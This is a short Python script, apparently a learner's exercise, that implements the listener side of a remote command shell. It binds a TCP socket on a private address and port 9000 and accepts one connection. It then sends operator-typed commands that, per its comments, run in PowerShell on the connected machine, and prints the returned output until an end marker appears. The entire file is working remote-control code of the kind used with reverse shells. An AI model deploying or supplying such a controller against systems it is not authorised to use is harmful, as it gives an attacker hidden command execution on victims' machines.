import socket

identifier = "<END OF FILE>"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#okay so s is for creating a socket obj for ip 4 and tcp
ip = "192.168.18.149"
port = 9000
#this is my ip and i am using port 9000 on my own
address = (ip,port)
s.bind(address)
s.listen(4)
print("listening to ip address")

#binding my address to server and allowing to 4 devices listen to it at a time and than accepting any requesst that comes

s,client_address = s.accept()
print("is connected to my server")
try:

    while True:
        #for entering a command which will run on other power shell
        message = input("enter command: ")
        if message == "":
            continue
        #for pressing enter key
        message = message.encode()
        s.send(message)
        #for sending command
        if message.decode() == "STOP":
            break


        output = b""
        #assinging an empty byte

        while True:

            #for reading chunk of memory each of 1048 bytes
            chunk = s.recv(1048)
            #print(chunk.decode())
            #checking if it end with identifier
            if chunk.endswith(identifier.encode()):
                output += chunk[:-len(identifier)]
                break
            #adding output
            output += chunk
            #printing output
        print(output.decode())
    s.close()
except:

    #error occurs closing server 
    s.send("STOP".encode())
    s.close()
    print("serverclosed")

